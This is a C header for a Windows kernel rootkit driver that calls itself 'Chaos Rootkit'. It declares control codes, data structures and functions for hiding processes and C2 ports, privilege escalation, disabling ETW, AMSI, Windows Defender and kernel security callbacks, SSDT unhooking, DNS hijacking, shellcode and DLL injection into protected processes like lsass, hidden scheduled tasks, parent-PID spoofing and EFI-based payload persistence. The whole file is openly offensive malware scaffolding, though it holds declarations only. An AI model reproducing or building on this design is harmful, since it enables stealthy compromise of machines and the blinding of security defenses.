#ifndef HEADER_H
#define HEADER_H

#include <fltkernel.h>
#include <minwindef.h>
#include <ntddk.h>
#include <ntdef.h>
#include <ntifs.h>

#include <ntstrsafe.h>
#include <wdm.h>

// ============================================================================
// BUILD MODE CONTROL
// ============================================================================
#ifdef NDEBUG
// RELEASE: Silence all debug output
#undef DbgPrint
#undef DbgPrintEx
#define DbgPrint(...) ((void)0)
#define DbgPrintEx(...) ((void)0)
#endif

// WFP includes for IP blocking and DNS hijacking
// Must include ndis.h before fwpsk.h
#define NDIS_SUPPORT_NDIS6 1
#define NDIS630 1
#pragma warning(push)
#pragma warning(disable : 4201) // nameless struct/union
#include <fwpmk.h>
#include <fwpsk.h>
#include <ndis.h>
#include <wsk.h>

#pragma warning(pop)

// ============================================================================
// PE IMAGE CONSTANTS (not in ZwSwapCert.h)
// ============================================================================
#ifndef IMAGE_DOS_SIGNATURE
#define IMAGE_DOS_SIGNATURE 0x5A4D // MZ
#endif
#ifndef IMAGE_NT_SIGNATURE
#define IMAGE_NT_SIGNATURE 0x00004550 // PE00
#endif
#ifndef IMAGE_DIRECTORY_ENTRY_EXPORT
#define IMAGE_DIRECTORY_ENTRY_EXPORT 0
#endif

typedef struct _IMAGE_EXPORT_DIRECTORY {
  ULONG Characteristics;
  ULONG TimeDateStamp;
  USHORT MajorVersion;
  USHORT MinorVersion;
  ULONG Name;
  ULONG Base;
  ULONG NumberOfFunctions;
  ULONG NumberOfNames;
  ULONG AddressOfFunctions;
  ULONG AddressOfNames;
  ULONG AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;

// ============================================================================
// EXISTING IOCTLs - Process/File Operations
// ============================================================================
#define HIDE_PROC                                                              \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x45, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PRIVILEGE_ELEVATION                                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_SYSTEM                                                \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x91, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB                                                \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x92, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS                                               \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x93, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE                                          \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x94, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINTCB_LIGHT                                          \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x95, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_WINDOWS_LIGHT                                         \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x96, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_LSA_LIGHT                                             \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x97, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_ANTIMALWARE_LIGHT                                     \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x98, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECTION_LEVEL_AUTHENTICODE_LIGHT                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x99, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define UNPROTECT_ALL_PROCESSES                                                \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x100, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define RESTRICT_ACCESS_TO_FILE_CTL                                            \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x169, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define BYPASS_INTEGRITY_FILE_CTL                                              \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x170, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ZWSWAPCERT_CTL                                                         \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x171, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define CR_SET_PROTECTION_LEVEL_CTL                                            \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x172, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define PROTECT_FILE_AGAINST_ANTI_MALWARE_CTL                                  \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x173, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ============================================================================
// AV/EDR BYPASS IOCTLs
// ============================================================================
#define KILL_ETW_CTL                                                           \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x200, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define KILL_AMSI_CTL                                                          \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x201, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define KILL_PROCESS_CALLBACKS_CTL                                             \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x202, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define KILL_THREAD_CALLBACKS_CTL                                              \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x203, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define KILL_IMAGE_CALLBACKS_CTL                                               \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x204, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define KILL_REGISTRY_CALLBACKS_CTL                                            \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x205, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define KILL_ALL_CALLBACKS_CTL                                                 \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x206, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FORCE_UNLOAD_DRIVER_CTL                                                \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x207, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define UNHOOK_SSDT_CTL                                                        \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x208, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define LIST_SSDT_HOOKS_CTL                                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x209, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ============================================================================
// NETWORKING IOCTLs
// ============================================================================
#define HIDE_PORT_CTL                                                          \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x300, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define UNHIDE_PORT_CTL                                                        \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x301, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define HIDE_ALL_C2_CTL                                                        \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x302, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define ADD_DNS_RULE_CTL                                                       \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x303, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define REMOVE_DNS_RULE_CTL                                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x304, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define LIST_DNS_RULES_CTL                                                     \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x305, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define BLOCK_IP_CTL                                                           \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x306, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define UNBLOCK_IP_CTL                                                         \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x307, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define LIST_BLOCKED_CTL                                                       \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x308, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define START_STEALTH_LISTENER_CTL                                             \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x309, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define STOP_STEALTH_LISTENER_CTL                                              \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x30A, METHOD_BUFFERED, FILE_ANY_ACCESS)

// IOCTLs to return rule arrays to usermode
#define GET_DNS_RULES_CTL                                                      \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x310, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GET_BLOCKED_IPS_CTL                                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x311, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define GET_HIDDEN_PORTS_CTL                                                   \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x312, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ============================================================================
// POST-EXPLOITATION IOCTLs
// ============================================================================
// Invisible Process Execution
#define RUN_HIDDEN_PROCESS_CTL                                                 \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x500, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define LIST_HIDDEN_PROCESSES_CTL                                              \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x501, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define KILL_HIDDEN_PROCESS_CTL                                                \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x502, METHOD_BUFFERED, FILE_ANY_ACCESS)

// PPL Injection
#define INJECT_INTO_PPL_CTL                                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x510, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Hidden Scheduled Tasks
#define CREATE_HIDDEN_TASK_CTL                                                 \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x520, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define LIST_HIDDEN_TASKS_CTL                                                  \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x521, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DELETE_HIDDEN_TASK_CTL                                                 \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x522, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Parent PID Spoofing
#define SPAWN_WITH_PPID_CTL                                                    \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x530, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ============================================================================
// BOOT DIAGNOSTICS IOCTL
// ============================================================================
#define GET_BOOT_DIAGNOSTICS_CTL                                               \
  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x400, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _BOOT_DIAGNOSTICS {
  BOOLEAN DriverConnected;
  BOOLEAN EtwDisabled;
  BOOLEAN AmsiCallbackRegistered;
  BOOLEAN DefenderRtpDisabled;
  BOOLEAN DefenderServiceDisabled;
  BOOLEAN PayloadConfigLoaded;
  BOOLEAN ProcessCallbackRegistered;
  WCHAR PayloadPath[260];
  ULONG PatchedProcessCount;
} BOOT_DIAGNOSTICS, *PBOOT_DIAGNOSTICS;

#define STATUS_ALREADY_EXISTS ((NTSTATUS)0xB7)
#define ERROR_UNSUPPORTED_OFFSET ((NTSTATUS)0x00000233)

typedef struct _PS_PROTECTION {
  union {
    UCHAR Level;
    struct {
      UCHAR Type : 3;
      UCHAR Audit : 1;
      UCHAR Signer : 4;
    };
  };
} PS_PROTECTION, *PPS_PROTECTION;

/* CR stands for Chaos Rootkit. */
typedef struct _CR_SET_PROTECTION_LEVEL {
  PS_PROTECTION Protection;
  HANDLE Process;
} CR_SET_PROTECTION_LEVEL, *PCR_SET_PROTECTION_LEVEL;

typedef struct foperationx {
  int rpid;
  wchar_t filename[MAX_PATH];
} fopera, *Pfoperation;

typedef struct protection_levels {
  BYTE PS_PROTECTED_SYSTEM;
  BYTE PS_PROTECTED_WINTCB;
  BYTE PS_PROTECTED_WINDOWS;
  BYTE PS_PROTECTED_AUTHENTICODE;
  BYTE PS_PROTECTED_WINTCB_LIGHT;
  BYTE PS_PROTECTED_WINDOWS_LIGHT;
  BYTE PS_PROTECTED_LSA_LIGHT;
  BYTE PS_PROTECTED_ANTIMALWARE_LIGHT;
  BYTE PS_PROTECTED_AUTHENTICODE_LIGHT;
} protection_level, *Pprotection_levels;

typedef struct eprocess_offsets {
  DWORD Token_offset;
  DWORD ActiveProcessLinks_offset;
  DWORD protection_offset;
} exprocess_offsets, *peprocess_offsets;

typedef struct x_hooklist {

  BYTE NtOpenFilePatch[12];
  void *NtOpenFileOrigin;
  void *NtOpenFileAddress;
  uintptr_t *NtOpenFileHookAddress;

  BYTE NtCreateFilePatch[12];
  BYTE NtCreateFileOrigin[12];
  void *NtCreateFileAddress;
  uintptr_t *NtCreateFileHookAddress;

  int takeCopy;
  int pID;
  wchar_t filename[MAX_PATH];

  BOOL check_off;
  UNICODE_STRING decoyFile;

} hooklist, *Phooklist;

// ============================================================================
// NETWORKING STRUCTURES
// ============================================================================

#define MAX_HIDDEN_PORTS 64
#define MAX_DNS_RULES 32
#define MAX_BLOCKED_IPS 64
#define MAX_DOMAIN_LEN 256

// Port hiding entry
typedef struct _HIDDEN_PORT {
  USHORT Port;
  BOOLEAN IsTcp;
  BOOLEAN InUse;
} HIDDEN_PORT, *PHIDDEN_PORT;

// DNS hijack rule
typedef struct _DNS_RULE {
  wchar_t Domain[MAX_DOMAIN_LEN];
  ULONG RedirectIp; // IPv4 in network byte order
  BOOLEAN InUse;
} DNS_RULE, *PDNS_RULE;

// IP block rule
typedef struct _BLOCKED_IP {
  ULONG Ip;    // IPv4 in network byte order
  USHORT Port; // 0 = all ports
  BOOLEAN InUse;
} BLOCKED_IP, *PBLOCKED_IP;

// Input structures for IOCTLs
typedef struct _PORT_REQUEST {
  USHORT Port;
  BOOLEAN IsTcp;
} PORT_REQUEST, *PPORT_REQUEST;

typedef struct _DNS_REQUEST {
  wchar_t Domain[MAX_DOMAIN_LEN];
  ULONG RedirectIp;
} DNS_REQUEST, *PDNS_REQUEST;

typedef struct _IP_REQUEST {
  ULONG Ip;
  USHORT Port;
} IP_REQUEST, *PIP_REQUEST;

typedef struct _DRIVER_UNLOAD_REQUEST {
  wchar_t DriverName[MAX_PATH];
} DRIVER_UNLOAD_REQUEST, *PDRIVER_UNLOAD_REQUEST;

// ============================================================================
// POST-EXPLOITATION STRUCTURES
// ============================================================================

// Payload type for execution requests
typedef enum _PAYLOAD_TYPE {
  PAYLOAD_TYPE_EXE = 0,      // Executable (.exe)
  PAYLOAD_TYPE_BAT = 1,      // Batch file (.bat)
  PAYLOAD_TYPE_PS1 = 2,      // PowerShell script (.ps1)
  PAYLOAD_TYPE_DLL = 3,      // DLL injection
  PAYLOAD_TYPE_SHELLCODE = 4 // Raw shellcode
} PAYLOAD_TYPE;

// Maximum sizes
#define MAX_PAYLOAD_SIZE 1024 * 1024 // 1MB max payload
#define MAX_HIDDEN_PROCESSES 32
#define MAX_HIDDEN_TASKS 32
#define MAX_TASK_NAME_LEN 256

// Hidden process entry (tracked by driver)
typedef struct _HIDDEN_PROCESS {
  ULONG Pid;
  ULONG ParentPid;
  wchar_t ImagePath[MAX_PATH];
  PAYLOAD_TYPE PayloadType;
  BOOLEAN InUse;
} HIDDEN_PROCESS, *PHIDDEN_PROCESS;

// Hidden task entry
typedef struct _HIDDEN_TASK {
  wchar_t TaskName[MAX_TASK_NAME_LEN];
  wchar_t Command[MAX_PATH];
  wchar_t Arguments[MAX_PATH];
  ULONG TriggerType; // 0=Boot, 1=Logon, 2=Schedule
  BOOLEAN InUse;
} HIDDEN_TASK, *PHIDDEN_TASK;

// Request to run hidden process
typedef struct _RUN_HIDDEN_REQUEST {
  PAYLOAD_TYPE PayloadType;
  ULONG FakeParentPid;         // 0 = no spoofing
  wchar_t Path[MAX_PATH];      // Path to exe/bat/ps1/dll
  wchar_t Arguments[MAX_PATH]; // Command line args
  ULONG ShellcodeSize;         // Size if PAYLOAD_TYPE_SHELLCODE
  // Shellcode follows immediately after in buffer
} RUN_HIDDEN_REQUEST, *PRUN_HIDDEN_REQUEST;

// Request to inject into PPL
typedef struct _PPL_INJECT_REQUEST {
  PAYLOAD_TYPE PayloadType;
  ULONG TargetPid;           // 0 = use TargetName
  wchar_t TargetName[64];    // csrss, lsass, smss, services, etc.
  wchar_t DllPath[MAX_PATH]; // For DLL injection
  ULONG ShellcodeSize;       // For shellcode
  // Shellcode follows immediately after in buffer
} PPL_INJECT_REQUEST, *PPPL_INJECT_REQUEST;

// Request to create hidden task
typedef struct _CREATE_HIDDEN_TASK_REQUEST {
  wchar_t TaskName[MAX_TASK_NAME_LEN];
  wchar_t Command[MAX_PATH];
  wchar_t Arguments[MAX_PATH];
  ULONG TriggerType; // 0=Boot, 1=Logon, 2=Schedule
} CREATE_HIDDEN_TASK_REQUEST, *PCREATE_HIDDEN_TASK_REQUEST;

// Request to spawn with PPID spoof
typedef struct _SPAWN_PPID_REQUEST {
  ULONG FakeParentPid;
  wchar_t ExecutablePath[MAX_PATH];
  wchar_t Arguments[MAX_PATH];
  BOOLEAN HideAfterSpawn; // Also apply DKOM hiding
} SPAWN_PPID_REQUEST, *PSPAWN_PPID_REQUEST;

// ============================================================================
// CALLBACK STRUCTURE (for enumerating kernel callbacks)
// ============================================================================

// Callback routine entry (from PspNotifyRoutines arrays)
typedef struct _CALLBACK_ENTRY {
  LIST_ENTRY ListEntry;
  ULONG_PTR Context;
  PVOID CallbackRoutine;
} CALLBACK_ENTRY, *PCALLBACK_ENTRY;

// ============================================================================
// GLOBAL STATE
// ============================================================================

hooklist xHooklist;
EX_PUSH_LOCK pLock;
exprocess_offsets eoffsets;
protection_level global_protection_levels;

// Networking state
HIDDEN_PORT g_HiddenPorts[MAX_HIDDEN_PORTS];
DNS_RULE g_DnsRules[MAX_DNS_RULES];
BLOCKED_IP g_BlockedIps[MAX_BLOCKED_IPS];
BOOLEAN g_EtwDisabled;
BOOLEAN g_AmsiDisabled;
BOOLEAN g_CallbacksRemoved;
KSPIN_LOCK g_NetworkLock;

// NSI Hook for port hiding
typedef NTSTATUS (*PFN_NSI_ENUMERATE_OBJECTS)(
    PVOID ModuleId, ULONG ObjectId, PVOID KeyData, ULONG KeySize, PVOID RwData,
    ULONG RwSize, PVOID RoStaticData, ULONG RoStaticSize, PVOID RoDynamicData,
    ULONG RoDynamicSize, PULONG Count);
extern PFN_NSI_ENUMERATE_OBJECTS g_OriginalNsiEnumerate;
extern BOOLEAN g_NsiHooked;

// NSI Hook functions
NTSTATUS InitNsiHook(void);
void CleanupNsiHook(void);
BOOLEAN IsPortHidden(USHORT Port, BOOLEAN IsTcp);

// WFP (Windows Filtering Platform) for IP blocking and DNS hijacking
extern HANDLE g_WfpEngineHandle;
extern UINT32 g_WfpCalloutIdV4;
extern UINT32 g_WfpCalloutIdV6;
extern UINT64 g_WfpFilterIdV4;
extern UINT64 g_WfpFilterIdV6;
extern BOOLEAN g_WfpInitialized;

// WFP functions
NTSTATUS InitWfpFiltering(void);
void CleanupWfpFiltering(void);
BOOLEAN IsIpBlocked(ULONG Ip, USHORT Port);

// Original function pointers for unhooking
PVOID g_OriginalEtwWrite;

// AMSI callback state
BOOLEAN g_AmsiCallbackRegistered;

// ============================================================================
// PAYLOAD AUTO-PROTECTION CONFIGURATION
// ============================================================================

typedef struct _PAYLOAD_CONFIG {
  WCHAR PayloadPath[MAX_PATH]; // Full path to payload EXE
  WCHAR PayloadName[260];      // Just filename for process matching
  BOOLEAN AutoProtect;         // Enable full protection stack
  BOOLEAN FileProtected;       // Track if file protection applied
  BOOLEAN ProcessCallbackRegistered;
} PAYLOAD_CONFIG, *PPAYLOAD_CONFIG;

PAYLOAD_CONFIG g_PayloadConfig;

// ============================================================================
// EXISTING FUNCTION DECLARATIONS
// ============================================================================

void IRP_MJCreate();
void IRP_MJClose();
NTSTATUS UnprotectAllProcesses();
NTSTATUS HideProcess(int pid);
NTSTATUS InitializeOffsets(Phooklist hooklist);
NTSTATUS PrivilegeElevationForProcess(int pid);
NTSTATUS ChangeProtectionLevel(PCR_SET_PROTECTION_LEVEL ProtectionLevel);
NTSTATUS InitializeStructure(Phooklist hooklist_s);
const char *PsGetProcessImageFileName(PEPROCESS Process);

// ============================================================================
// WINDOWS DEFENDER DISABLE
// ============================================================================

NTSTATUS DisableDefenderRegistry();

// ============================================================================
// AV/EDR BYPASS FUNCTION DECLARATIONS
// ============================================================================

NTSTATUS KillEtw();
NTSTATUS KillAmsi(HANDLE ProcessId);
NTSTATUS KillAmsiGlobal();
VOID AmsiImageLoadCallback(PUNICODE_STRING FullImageName, HANDLE ProcessId,
                           PIMAGE_INFO ImageInfo);
NTSTATUS KillProcessCallbacks();
NTSTATUS KillThreadCallbacks();
NTSTATUS KillImageCallbacks();
NTSTATUS KillRegistryCallbacks();
NTSTATUS KillAllCallbacks();
NTSTATUS ForceUnloadDriver(PUNICODE_STRING DriverName);
NTSTATUS UnhookSsdt();
NTSTATUS ListSsdtHooks(PVOID OutputBuffer, ULONG OutputSize,
                       PULONG BytesWritten);

// ============================================================================
// PAYLOAD AUTO-PROTECTION FUNCTION DECLARATIONS
// ============================================================================

NTSTATUS LoadPayloadConfig(PPAYLOAD_CONFIG Config);
VOID PayloadProcessCallback(PEPROCESS Process, HANDLE ProcessId,
                            PPS_CREATE_NOTIFY_INFO CreateInfo);
NTSTATUS SetupPayloadAutostart();
NTSTATUS CheckAndRestorePayloadFromEfi();
BOOLEAN FileExistsKernel(PWCHAR FilePath);
NTSTATUS CopyFileKernel(PWCHAR SourcePath, PWCHAR DestPath);
PVOID FindExportInModule(PVOID ModuleBase, PCSTR ExportName);

// ============================================================================
// NETWORKING FUNCTION DECLARATIONS
// ============================================================================

NTSTATUS HidePort(USHORT Port, BOOLEAN IsTcp);
NTSTATUS UnhidePort(USHORT Port, BOOLEAN IsTcp);
NTSTATUS HideAllC2Ports();
NTSTATUS AddDnsRule(PWCHAR Domain, ULONG RedirectIp);
NTSTATUS RemoveDnsRule(PWCHAR Domain);
NTSTATUS ListDnsRules(PVOID OutputBuffer, ULONG OutputSize,
                      PULONG BytesWritten);
NTSTATUS WriteToHostsFile(ULONG Ip, PWCHAR Domain);
NTSTATUS RemoveFromHostsFile(PWCHAR Domain);
NTSTATUS BlockIp(ULONG Ip, USHORT Port);
NTSTATUS UnblockIp(ULONG Ip, USHORT Port);
NTSTATUS ListBlockedIps(PVOID OutputBuffer, ULONG OutputSize,
                        PULONG BytesWritten);
NTSTATUS StartStealthListener(USHORT Port);
NTSTATUS StopStealthListener();

// Helper functions
PVOID FindKernelFunction(PCWSTR FunctionName);
NTSTATUS PatchKernelMemory(PVOID Address, PVOID Patch, SIZE_T Size);

// ============================================================================
// POST-EXPLOITATION FUNCTION DECLARATIONS
// ============================================================================

// Invisible Process Execution
NTSTATUS RunHiddenProcess(PRUN_HIDDEN_REQUEST Request);
NTSTATUS ListHiddenProcesses(PVOID OutputBuffer, ULONG OutputSize,
                             PULONG BytesWritten);
NTSTATUS KillHiddenProcess(ULONG Pid);

// PPL Injection
NTSTATUS InjectIntoPPL(PPPL_INJECT_REQUEST Request);

// Hidden Scheduled Tasks
NTSTATUS CreateHiddenTask(PCREATE_HIDDEN_TASK_REQUEST Request);
NTSTATUS ListHiddenTasks(PVOID OutputBuffer, ULONG OutputSize,
                         PULONG BytesWritten);
NTSTATUS DeleteHiddenTask(PWCHAR TaskName);

// Parent PID Spoofing
NTSTATUS SpawnWithPpid(PSPAWN_PPID_REQUEST Request);

// ============================================================================
// POST-EXPLOITATION GLOBAL STATE
// ============================================================================

extern HIDDEN_PROCESS g_HiddenProcesses[MAX_HIDDEN_PROCESSES];
extern HIDDEN_TASK g_HiddenTasks[MAX_HIDDEN_TASKS];
extern KSPIN_LOCK g_HiddenProcessLock;
extern KSPIN_LOCK g_HiddenTaskLock;

#endif
